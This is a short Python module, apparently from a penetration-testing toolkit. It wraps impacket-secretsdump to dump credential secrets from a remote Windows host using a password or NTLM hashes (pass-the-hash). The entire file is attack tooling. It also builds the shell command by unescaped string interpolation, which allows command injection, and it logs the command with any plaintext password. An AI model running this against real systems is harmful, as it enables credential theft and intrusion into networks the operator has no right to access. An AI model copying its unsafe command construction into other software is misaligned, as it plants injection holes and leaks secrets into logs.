#!/usr/bin/env python3
from ipaddress import IPv4Address
import logging
import typing as T

from . import shell
from .toolz import *
from . import logging

log = logging.new_log(__name__)

@curry
def secretsdump(ip: T.Union[str, IPv4Address], user: str, hashes=None, 
                password=None, domain=None, *, 
                secretsdump_exec='impacket-secretsdump',
                getoutput=shell.getoutput, **secretsdump_options):

    options = pipe(
        secretsdump_options,
        keymap(replace('_', '-')),
        keymap(lambda k: f'-{k}'),
        valmap(lambda v: '' if v is True else to_str(v)),
        items,
        map(' '.join),
        ' '.join,
    )

    user = (
        f'{domain}/{user}' if domain else user
    )

    command = (
        f"{secretsdump_exec} -hashes {hashes} {options} '{user}@{ip}'"
        if hashes else
        f"{secretsdump_exec} {options} '{user}':'{password}'@'{ip}'"
    )

    log.info(f'secretsdump command: {command}')

    return getoutput(command)
    

